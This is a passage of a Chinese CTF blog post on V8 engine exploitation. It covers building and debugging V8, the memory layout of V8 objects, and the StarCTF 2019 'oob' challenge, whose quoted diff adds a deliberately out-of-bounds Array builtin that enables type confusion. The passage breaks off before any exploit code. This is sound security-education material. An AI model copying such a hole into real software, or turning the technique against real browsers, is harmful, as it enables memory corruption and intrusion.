<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="baidu-site-verification" content="NkA6ndXFZC">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
<meta name="description" content="pwn v8 入门学习，以及 starctf-oob 题目的复现过程">
<meta property="og:type" content="article">
<meta property="og:title" content="v8 入门及 starctf-oob 复现">
<meta property="og:url" content="http://www.xi4oyu.top/3b546c3b/index.html">
<meta property="og:site_name" content="feather&#39;s blog">
<meta property="og:description" content="pwn v8 入门学习，以及 starctf-oob 题目的复现过程">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-0.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-2.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-3.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-5.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-6.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-7.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-8.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-9.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-10.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-11.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-10.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-12.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-13.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-14.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-15.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-16.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-17.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-18.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-20.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-21.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-22.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-23.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-24.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-25.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-26.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-27.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-28.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-29.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-30.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-31.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-32.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-33.png">
<meta property="og:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-36.png">
<meta property="article:published_time" content="2021-02-26T13:46:00.000Z">
<meta property="article:modified_time" content="2021-02-26T13:46:00.000Z">
<meta property="article:author" content="feather">
<meta property="article:tag" content="v8">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.xi4oyu.top/images/3b546c3b/pasted-0.png">


<link rel="canonical" href="http://www.xi4oyu.top/3b546c3b/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/3b546c3b/","path":"3b546c3b/","title":"v8 入门及 starctf-oob 复现"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>v8 入门及 starctf-oob 复现 | feather's blog</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">feather's blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#v8-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">v8 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#v8-%E7%BC%96%E8%AF%91%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.</span> <span class="nav-text">v8 编译步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#StarCTF-2019-oob-%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">StarCTF 2019 oob 复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#oob-diff"><span class="nav-number">4.1.</span> <span class="nav-text">oob.diff</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86"><span class="nav-number">4.2.</span> <span class="nav-text">类型混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-number">4.3.</span> <span class="nav-text">任意地址读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F"><span class="nav-number">4.4.1.</span> <span class="nav-text">传统方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E4%BC%A0%E7%BB%9F%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">4.4.2.</span> <span class="nav-text">非传统利用方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
  <p class="site-author-name" itemprop="name">feather</p>
  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">62</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">40</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
        </li>
    </ul>
  </div>

          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/3b546c3b/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="feather">
      <meta itemprop="description" content="计算机技术&个人琐碎事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="feather's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          v8 入门及 starctf-oob 复现
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-02-26 21:46:00" itemprop="dateCreated datePublished" datetime="2021-02-26T21:46:00+08:00">2021-02-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/v8/" itemprop="url" rel="index"><span itemprop="name">v8</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>19k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>17 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>pwn v8 入门学习，以及 starctf-oob 题目的复现过程</p>
<span id="more"></span>

<h2 id="v8-环境搭建"><a href="#v8-环境搭建" class="headerlink" title="v8 环境搭建"></a>v8 环境搭建</h2><p>安装依赖</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> binutils python2.7 perl socat <span class="token function">git</span> build-essential gdb gdbserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安装 depot_tools</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
<span class="token builtin class-name">echo</span> <span class="token string">'export PATH=$PATH:"/path/to/depot_tools"'</span> <span class="token operator">>></span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>编译 ninja</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/ninja-build/ninja.git 
<span class="token builtin class-name">cd</span> ninja <span class="token operator">&amp;&amp;</span> ./configure.py --bootstrap
<span class="token builtin class-name">echo</span> <span class="token string">'export PATH=$PATH:"/path/to/ninja"'</span> <span class="token operator">>></span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="v8-编译步骤"><a href="#v8-编译步骤" class="headerlink" title="v8 编译步骤"></a>v8 编译步骤</h2><p>用 depot_tools 的工具拉取 v8 源码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fetch v8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>随后，同步源码，然而 fetch 之后就是最新的了，这一步也不是必要的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> v8 <span class="token operator">&amp;&amp;</span> gclient <span class="token function">sync</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后编译 v8</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tools/dev/v8gen.py x64.debug <span class="token operator">&amp;&amp;</span> ninja -C out.gn/x64.debug <span class="token comment"># debug 版本</span>
tools/dev/v8gen.py x64.release <span class="token operator">&amp;&amp;</span> ninja -C out.gn/x64.release <span class="token comment"># release 版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>编译完后，可用在 <code>out.gn/x64.debug</code> 里的 d8 来执行，调试 js 代码</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>v8 提供了 gdb 的调试插件<br><img src="/images/3b546c3b/pasted-0.png" alt="gdb-v8-support"></p>
<p>添加到 gdbinit 脚本中</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">source</span> /path_to_v8/tools/gdbinit
<span class="token builtin class-name">source</span> /path_to_v8/tools/gdb-v8-support.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>写一个测试脚本，学习一下基本的调试</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token operator">:</span> <span class="token string">'asd'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>运行 d8 加上 <code>--allow-natives-syntax</code> 参数，以支持 <code>%DebugPrint</code> 和 <code>%SystemBreak</code> 等</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./d8 --allow-natives-syntax ./test.js
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>运行结果如下：<br><img src="/images/3b546c3b/pasted-2.png" alt="d8test"></p>
<p><code>%DebugPrint</code> 的功能是输出显示变量，对于对象，会将对象的地址显示出来，而 <code>%SystemBreak</code> 的作用是触发一个调试中断</p>
<p>现在用 gdb 来调试，<code>gdb ./d8</code></p>
<p>然后设置一下命令行参数 <code>set args --allow-natives-syntax ./test.js</code></p>
<p><code>run</code> 命令开始调试，可以看到，由于 <code>%SystemBreak</code>，程序暂停运行，并看到 <code>%DebugPrint(a)</code> 输出<br><img src="/images/3b546c3b/pasted-3.png" alt="dbgtest1"></p>
<p><code>c</code> 命令继续运行，可以看到对象的地址输出来了<br><img src="/images/3b546c3b/pasted-5.png" alt="dbgtest2"></p>
<p>这里附加说明一下，<strong>v8 里的对象地址，最低 bit 都是 1，减去 1 才是真实存储对象数据的起始地址</strong></p>
<p>由于 v8 提供的 gdb 插件，我们可以使用 <code>job</code> 命令来查看对象更详细的信息<br><img src="/images/3b546c3b/pasted-6.png" alt="dbgtest3"></p>
<p>先继续运行，来到第三处断点<br><img src="/images/3b546c3b/pasted-7.png" alt="dbgtest4"><br><img src="/images/3b546c3b/pasted-8.png" alt="dbgtest5"></p>
<p>这里简单讲讲 v8 对象的存储结构，主要有 map，prototype，elements，length，properties<br><img src="/images/3b546c3b/pasted-9.png" alt="dbgtest6"></p>
<p>map 用来表明对象的类型，elements 是一个对象指针，存储了数组的元素，length 就是数组的大小，properties 也是一个对象指针，存储了对象的属性</p>
<p>这里再使用 telescope 命令（pwndbg 插件）查看对象的内存布局<br><img src="/images/3b546c3b/pasted-10.png" alt="dbgtest7"></p>
<p>另一方面也看到了，length 整数值存储在高 32 位上</p>
<p>前面说了，elements 也是一个对象，同样可以使用 job 命令查看<br><img src="/images/3b546c3b/pasted-11.png" alt="dbgtest8"></p>
<h2 id="StarCTF-2019-oob-复现"><a href="#StarCTF-2019-oob-复现" class="headerlink" title="StarCTF 2019 oob 复现"></a>StarCTF 2019 oob 复现</h2><p>题目可以从这里下载：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB">https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB</a></p>
<p>题目提供了一个 oob.diff 文件，并且 commit 是 <code>6dc88c191f5ecc5389dc26efa3ca0907faef3598</code></p>
<p>这里先根据 diff 文件 patch 源码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> reset --hard  6dc88c191f5ecc5389dc26efa3ca0907faef3598
<span class="token function">git</span> checkout
<span class="token function">git</span> apply <span class="token operator">&lt;</span> /path_to_diff/oob.diff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里要注意的是，这个题目，使用 debug 版编译，调试的时候有些问题，需要改用 release 模式编译</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tools/dev/v8gen.py x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>但是为了使用 job 等调试命令，需要在 <code>out.gn/x64.release/args.gn</code> 文件加入以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none">v8_enable_backtrace &#x3D; true
v8_enable_disassembler &#x3D; true
v8_enable_object_print &#x3D; true
v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后编译即可</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ninja -C out.gn/x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="oob-diff"><a href="#oob-diff" class="headerlink" title="oob.diff"></a>oob.diff</h3><p>接下来要分析题目给的 oob.diff 对 v8 源码做了什么修改，文件关键内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">...
+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,
+                          Builtins::kArrayOob,2,false);
...
+BUILTIN(ArrayOob)&#123;
+    uint32_t len &#x3D; args.length();
+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle&lt;JSReceiver&gt; receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle&lt;JSArray&gt; array &#x3D; Handle&lt;JSArray&gt;::cast(receiver);
+    FixedDoubleArray elements &#x3D; FixedDoubleArray::cast(array-&gt;elements());
+    uint32_t length &#x3D; static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
+    if(len &#x3D;&#x3D; 1)&#123;
+        &#x2F;&#x2F;read
+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
+    &#125;else&#123;
+        &#x2F;&#x2F;write
+        Handle&lt;Object&gt; value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+        elements.set(length,value-&gt;Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    &#125;
+&#125;
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，diff 文件给 Array 数组对象增加了一个 oob 方法，参数个数为 1 和 2 的情况做了不同的处理，参数个数为 1 时，即调用方法无参数的时候（因为对象 this 指针是第一个参数），将 <code>elements[length]</code> 的值返回 ，参数个数为 2 时，即调用方法有一个参数时，将调用方法传递的参数值写入  <code>elements[length]</code></p>
<p>所以 oob 存在一个<strong>越界读写</strong>数组的漏洞</p>
<h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>再次回到前面的一张图片<br><img src="/images/3b546c3b/pasted-10.png" alt="layout"></p>
<p>对象 <code>c</code> 的 elements 指针指向的地址为 <code>0x36563a38de11</code>，而对象 <code>c</code> 的地址为 <code>0x36563a38de31</code>，且对象开头就是 map，所以 map 在 elements 指针指向区域的后面，如果越界读写 elements，就有可能修改 map，造成类型混淆</p>
<p>参考下面代码，进行一个调试，查看不同类型的数组对象的内存布局</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

